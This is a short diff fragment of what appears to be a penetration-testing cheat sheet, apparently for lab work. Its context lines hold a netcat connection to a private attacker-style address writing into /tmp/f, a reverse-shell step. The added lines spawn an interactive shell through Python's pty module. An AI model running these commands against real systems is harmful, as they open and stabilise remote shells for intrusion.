@@ -67,4 +67,8 @@ set shell options
 open a connection with netcat
 nc 10.10.14.12 7777 > /tmp/f  
 
+Spawn python shell:
+python -c 'import pty; pty.spawn("/bin/sh")' 
+
+
 
